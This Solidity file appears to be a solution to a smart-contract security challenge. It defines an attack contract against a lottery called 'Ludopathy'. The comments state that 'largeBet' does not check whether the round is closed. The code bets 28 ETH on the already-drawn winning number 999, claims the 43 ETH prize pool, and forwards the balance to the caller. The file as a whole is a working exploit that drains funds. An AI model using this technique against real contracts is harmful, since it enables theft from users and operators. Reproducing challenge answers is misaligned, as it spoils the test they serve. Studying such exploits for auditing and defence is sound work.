// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "targets/ludopathy/src/Ludopathy.sol";

contract LudopathyAttack {
    Ludopathy public ludopathy;

    constructor(Ludopathy _ludopathy) {
        ludopathy = _ludopathy;
    }

    // Was: largeBet doesn't check roundClosed, so we can bet on the known winner (999)
    // after selectWinningNumber has been called, then claim the inflated prize.
    function attack() external payable {
        // Step 1: Bet 28 numbers on 999 (the known winner), costs 28 ETH
        // Was: need enough numbers so (1 + 28) * 1.5 = 43.5 ETH >= 43 ETH prizePool
        uint96[] memory nums = new uint96[](1);
        nums[0] = 999;
        uint200[] memory amts = new uint200[](1);
        amts[0] = 28;
        ludopathy.largeBet{value: 28 ether}(nums, amts);

        // Step 2: Claim prize for round 1 — pays min(43.5, 43) = 43 ETH
        ludopathy.claimPrize(1);

        // Step 3: Send everything back to caller (the player EOA)
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {}
}
